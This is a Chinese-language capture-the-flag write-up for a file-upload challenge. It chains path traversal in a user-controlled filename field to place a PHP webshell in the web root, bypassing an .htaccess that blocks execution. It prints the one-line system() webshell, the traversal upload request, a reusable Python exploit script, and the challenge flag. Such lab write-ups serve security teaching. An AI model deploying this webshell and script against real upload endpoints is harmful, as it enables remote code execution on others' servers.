# WP · qsnctf 文件上传（端口 40536）

> 题目：`http://challenge.qsnctf.com:40536/`
> Flag：`flag{3ff4d00c191847bb9898b1da0ff3ea6b}`
> 类型：文件上传 + 路径穿越 + 解析绕过 + 命令执行（getshell）
> 日期：2026-08-15

---

## 一、信息收集

| 项 | 值 |
|---|---|
| 页面 | 文件上传系统（前端 JS 上传，支持格式"随便传，最大 2MB"） |
| 上传接口 | `upload.php`（POST，multipart） |
| 提交字段 | `file`（文件本体）+ `filename`（文件名文本字段） |
| 后端 | Apache/2.4.38 (Debian) + PHP/7.2.34 |
| 保存位置 | `./uploads/<文件名>`（相对网站根目录） |

前端 JS 逻辑（关键片段）：
```js
formData.append('file', file);
formData.append('filename', file.name);   // 原始文件名单独作为一个字段传
fetch('upload.php', { method: 'POST', body: formData })
```
**前端只校验大小（≤2MB），不校验文件类型** → 类型过滤只能看后端。

---

## 二、第一步：直接传 .php，发现"上传成功但无法执行"

用 multipart 上传 `probe.php`（内容 `<?php ... ?>`），返回 `文件上传成功！文件名：./uploads/probe.php`。

但访问 `http://.../uploads/probe.php` 时，**返回的是 PHP 源码原文**，不是执行结果。

原因：用 `curl`/浏览器访问 `/uploads/.htaccess` 得到 `403 Forbidden` → **`uploads/` 目录里预置了一个 `.htaccess`**，它把该目录的 PHP 全部禁解析（相当于 `php_flag engine off` 之类）。所以无论传 `.php` / `.phtml` / `.php5` / 大小写变体，**全都不执行**，只能拿到源码原文。

> 验证过的不解析后缀：`php` `phtml` `php5` `php7` `pht` `PHP` `pHp` `php.jpg` 等，一律返回源码原文。

---

## 三、第二步：试 .htaccess 覆盖 —— 被堵

经典文件上传进阶手法：上传一个自己的 `.htaccess`，内容如 `AddType application/x-httpd-php .txt`，让某后缀被当成 PHP 解析。

但上传 `.htaccess` 时后端返回 `400 上传失败：同名文件已存在` → 预置的 `.htaccess` 已占坑，**无法覆盖**。这条路死。

---

## 四、第三步：路径穿越（关键突破）

保存的文件名来自我们完全可控的 `filename` 字段。如果后端**没有用 `basename()` 过滤 `../`**，就能把文件写到 `uploads/` 之外——即**网站根目录**（那里会正常解析 PHP，不受 uploads 的 `.htaccess` 限制）。

实测上传 `filename = "../pwn.php"`：
```
POST upload.php
file = (webshell 内容)
filename = ../pwn.php
```
返回：`文件上传成功！文件名：./uploads/../pwn.php`

`./uploads/../pwn.php` 规范化后 = `./pwn.php` = **网站根目录下的 `pwn.php`**。

访问 `http://.../pwn.php` → 返回 `PWN_7.2.34`（PHP 真的执行了！）✅

---

## 五、第四步：传命令执行马，读 flag

因为 `pwn.php` 已存在不能覆盖，再传一个 `filename = "../cmd.php"`，内容：
```php
<?php echo system($_GET['c']); ?>
```
访问：
```
http://challenge.qsnctf.com:40536/cmd.php?c=cat /f*
```
返回：
```
flag{3ff4d00c191847bb9898b1da0ff3ea6b}
flag{3ff4d00c191847bb9898b1da0ff3ea6b}
```
根目录 `/flag` 文件内容即 flag。

---

## 六、完整攻击链一句话

> 上传点只校验大小、保存名完全可控 → `uploads/` 有 `.htaccess` 禁解析且无法覆盖 → 用 `../` 把 webshell 写到会解析 PHP 的**网站根目录** → 直接 RCE → `cat /f*` 读 flag。

---

## 七、知识点小结（这题学到的 6 件事）

1. **上传成功 ≠ 能执行**：文件落在哪个目录、该目录是否解析 PHP，决定了 webshell 能不能跑。落在 `uploads/`（被 `.htaccess` 禁解析）就废了。
2. **`.htaccess` 是目录级"规则文件"**：出题人常预置它在 `uploads/` 禁止 PHP 解析，专治"传个 .php 就完事"。
3. **`.htaccess` 无法覆盖时**，要换思路——不要死磕它。
4. **路径穿越是最稳的绕过**：只要保存名没做 `basename()`/`realpath()` 过滤，`../` 就能把文件写到任意（有写权限的）目录。本题正好把马写到了会解析 PHP 的网站根。
5. **"保存到哪"由 `filename` 字段控制**：前端把真实文件名放进 `filename` 字段，后端若直接拼路径就送命。
6. **拿到 RCE 后读 flag 用通配符 `cat /f*`**：既避开黑名单里的 "flag" 字面量（本题无此限制，但习惯保留），又能应对未知文件名。

---

## 八、复用脚本（下次做题直接改 URL/命令）

```python
import urllib.request, urllib.parse

def upload(fname, content):
    boundary = "----wbtestboundary"
    body = f"--{boundary}\r\n".encode()
    body += f'Content-Disposition: form-data; name="file"; filename="{fname}"\r\n'.encode()
    body += b"Content-Type: application/octet-stream\r\n\r\n"
    body += content + b"\r\n"
    body += f"--{boundary}\r\n".encode()
    body += b'Content-Disposition: form-data; name="filename"\r\n\r\n'
    body += fname.encode() + b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    req = urllib.request.Request("http://目标/upload.php", data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}, method="POST")
    return urllib.request.urlopen(req, timeout=20).read().decode(errors='ignore')

# 1) 把命令马写到网站根（路径穿越）
upload("../cmd.php", b"<?php echo system($_GET['c']); ?>")
# 2) 执行
url = "http://目标/cmd.php?" + urllib.parse.urlencode({'c': "cat /f*"})
print(urllib.request.urlopen(url, timeout=20).read().decode(errors='ignore'))
```

> ⚠️ 实战/答题结束后记得清掉自己上传的 `cmd.php` / `pwn.php` 等 webshell（CTF 练习环境可留作复现，真实渗透必须清理痕迹）。
